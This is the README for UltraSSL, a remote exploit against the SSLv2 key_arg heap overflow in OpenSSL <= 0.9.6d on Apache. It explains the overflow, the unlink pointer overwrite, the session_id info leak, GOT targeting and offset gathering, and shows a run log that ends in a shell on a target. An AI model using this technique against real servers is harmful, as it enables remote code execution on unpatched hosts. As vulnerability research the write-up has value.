********************* FOUNDSTONE RESEARCH LABS PROPRIETARY *********************

UltraSSL - Remote OpenSSL <= 0.9.6d Apache Exploit
Written by Marshall Beddoe <marshall.beddoe@foundstone.com>
Copyright (c) 2002 Foundstone, Inc.  Do not distribute

OVERVIEW:

A vulnerability has been discovered in the SSL version 2 key exchange portion
of the popular OpenSSL software library.  This vulnerability affects a large
amount of machines worldwide, therefore analysis and exploitation of this 
vulnerability is of high priority.

THE VULNERABILITY:

OpenSSL's problem is caused by the following lines of code:

-----------------------------------------------------------------------
1|  memcpy(s->session->key_arg, &(p[s->s2->tmp.clear + s->s2->tmp.enc]),
2|           (unsigned int) keya);
-----------------------------------------------------------------------

A user has the ability to craft a client master key packet, controlling the
variable 'keya.'  By changing 'keya' to a large number, more data will be
written to s->session->key_arg then otherwise expected.  The key_arg variable 
is actually an 8 byte array in the SSL_SESSION structure, located on the heap.

EXPLOITATION:

Exploiting this vulnerability is not as vanilla as most other bugs and since
it is in the heapspace there may or may not be an exploitation technique that
works across multiple platforms.  The technique presented in this README will
work across multiple platforms and does not rely on any OS specific memory
allocation routines.

What we are essentially doing is overwriting all elements in the SSL_SESSION 
structure that follow the key_arg variable.  The following figure shows the 
SSL_SESSION structure:

typedef struct ssl_session_st
{
        int ssl_version;        
        unsigned int key_arg_length;

        unsigned char key_arg[SSL_MAX_KEY_ARG_LENGTH];  <----- Overflow here

        int master_key_length;
        unsigned char master_key[SSL_MAX_MASTER_KEY_LENGTH];
        unsigned int session_id_length;
        unsigned char session_id[SSL_MAX_SSL_SESSION_ID_LENGTH];
        unsigned int sid_ctx_length;
        unsigned char sid_ctx[SSL_MAX_SID_CTX_LENGTH];
        int not_resumable;
        struct sess_cert_st /* SESS_CERT */ *sess_cert;
        X509 *peer;
        long verify_result; /* only for servers */
        int references;
        long timeout;
        long time;
        int compress_meth;
        SSL_CIPHER *cipher;
        unsigned long cipher_id;
        STACK_OF(SSL_CIPHER) *ciphers; /* shared ciphers? */
                  CRYPTO_EX_DATA ex_data; /* application specific data */a

        struct ssl_session_st *prev,*next;              <------- GOOD!
} SSL_SESSION;

At first glance, there does not seem to be anything extremely interesting in
this structure to overwrite (no function pointers).  However, there are some
prev and next pointers located at the bottom of the structure.  These pointers
are used for managing lists of ssl sessions within the software application.

When an SSL session handshake is completed, it is placed in a linked list by 
using the following function:

(from ssl_sess.c - heavily truncated)
-----------------------------------------------------------------------
01| static void SSL_SESSION_list_add(SSL_CTX *ctx, SSL_SESSION *s)
02| {
03|         if ((s->next != NULL) && (s->prev != NULL))
04|                 SSL_SESSION_list_remove(ctx,s);
05|         .
06| 	 	   .
07|   	   .
08| }
-----------------------------------------------------------------------

Basically, if the next and prev pointers are not NULL (which they will not be
once we overflow them), OpenSSL will attempt to remove that particular session
from the linked list.  Overwriting of arbitrary 32 bit words in memory occurs 
in the SSL_SESSION_list_remove function:

(from ssl_sess.c - heavily truncated)
-----------------------------------------------------------------------
01| static void SSL_SESSION_list_remove(SSL_CTX *ctx, SSL_SESSION *s)
02| {
03|         /* middle of list */
04|        	s->next->prev=s->prev;
05|         s->prev->next=s->next;
06| }
-----------------------------------------------------------------------

In assembly code:

0x1c532 <SSL_SESSION_list_remove+210>:  mov    %ecx,0xc0(%eax)
0x1c538 <SSL_SESSION_list_remove+216>:  mov    0xc(%ebp),%edx

This code block allows the ability to overwrite any 32 bit memory address
with another 32 bit memory address.  For example to overwrite the GOT address
of strcmp, we would craft our buffer whereas the next pointer contained the
address of strcmp - 192 and the prev pointer contained the address to our 
shellcode.

THE CAVEAT:

The one caveat for exploiting this vulnerability is two pointers located in the
SSL_SESSION structure: cipher and ciphers.  These pointers handle the decryption
routines for the SSL sesssion, thus if they are corrupted, no decryption will
take place successfully and our session will never be placed in the list.

To be successful, we must have the ability to figure out what these values
are before we craft our exploitation buffer.  

Fortunately, the vulnerability in OpenSSL introduced an information leak 
problem.  When the SSL server sends the "server finish" message during the SSL
handshake, it sends to the client the session_id found in the SSL_SESSION
structure.

(from s2_srvr.c)
-----------------------------------------------------------------------
01| static int 
02| server_finish(SSL * s)
03| {
04|        unsigned char *p;
05|
06|        if (s->state == SSL2_ST_SEND_SERVER_FINISHED_A) {
07|                p = (unsigned char *) s->init_buf->data;
08|                *(p++) = SSL2_MT_SERVER_FINISHED;
09|
10|                memcpy(p, s->session->session_id,
11|                       (unsigned int) s->session->session_id_length);
12|                /* p+=s->session->session_id_length; */
13|
14|               s->state = SSL2_ST_SEND_SERVER_FINISHED_B;
15|                s->init_num = s->session->session_id_length + 1;
16|                s->init_off = 0;
17|        }
18|        /* SSL2_ST_SEND_SERVER_FINISHED_B */
19|        return (ssl2_do_write(s));
20| }
-----------------------------------------------------------------------

On lines 10 and 11, OpenSSL copies to a buffer the session_id up to the length
specified by session_id_length.  The element 'session_id_length' is located
below the key_arg array in the structure, thus we have the ability to modify
its value.  By specifying the session_id_length to be 112 bytes, we will 
receive a dump of heap space from the OpenSSL server which includes the
addresses of the cipher and ciphers pointers.

Now that we have the addresses of cipher and ciphers, we need to find a place
to stick our shellcode.  First, we need to have shellcode that reuses the
current socket connection.  Unfortunately, shellcode that traverses the file
descriptors and duplicates them to standard in/out/error is quite large in size.
To cause successful shellcode execution, we have to break our shellcode into 
two chunks, placing one in the session_id structure and the other in the
memory following the SSL_SESSION structure.

Lastly, we need to have the ability to accurately predict where our shellcode
is in memory.  Due to the unpredictability of the heap space, it would be 
tough to brute force effectively.  However, in fresh apache processes the first
SSL_SESSION structure is always located at a static offset from the ciphers
pointer (which was acquired via the information leak).  To exploit successfully,
we overwrite the global offset table address of strcmp (because the socket 
descriptor for that process is still open), with the address of ciphers - 136.
This technique has been working quite well and we have been able to successfully
exploit multiple linux versions in the wild.

IMPROVING THE EXPLOIT:

Future improvements for this vulnerability include:
  * FreeBSD/OpenBSD/Solaris/Win32 Support
  * Program redirection independent from GOT table

To gather offsets for a Linux system:
  $ objdump -R /usr/sbin/httpd | grep strcmp
  080b0ac8 R_386_JUMP_SLOT		strcmp

Edit the ultrassl.c source code and in the target array place:
	{ 0x080b0ac8, "slackware 8.1"},

CONCLUSION:

In this README, I have presented a platform independent exploitation technique
for the latest vulnerability in OpenSSL.  Although exploitation is definately
possible, the exploit may fail due to the state of the web server one is trying
to exploit.  The more SSL traffic the target recieves legitimately, the tougher
it will be to exploit successfully.  Note: sometimes you must run the exploit
multiple times.

(bind@ninsei ~/coding/exploits/ultrassl) > ./ultrassl -t2 10.0.48.64
ultrassl - an openssl <= 0.9.6d apache exploit
written by marshall beddoe <marshall.beddoe@foundstone.com>

exploiting redhat 7.2 (Enigma)
using 104 byte shellcode

creating connections: 20 of 20

performing information leak:
06 15 56 33 4b a2 33 24  39 14 0e 42 75 5a 22 f6  | ..V3K.3$9..BuZ".
a4 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  | ................
00 20 00 00 00 62 33 38  31 61 30 63 61 38 66 36  | . ...b381a0ca8f6
39 30 33 35 37 32 64 65  34 36 39 31 35 34 65 33  | 903572de469154e3
39 36 62 31 66 00 00 00  00 f0 51 15 08 00 00 00  | 96b1f.....Q.....
00 00 00 00 00 01 00 00  00 2c 01 00 00 64 70 87  | .........,...dp.
3d 00 00 00 00 8c 10 46  40 00 00 00 00 c0 51 15  | =......F@.....Q.
08                                                | .

cipher  = 0x4046108c
ciphers = 0x081551c0

performing exploitation..

Linux tobor 2.4.7-10 i686 unknown
uid=48(apache) gid=48(apache) groups=48(apache)

********************************************************************************
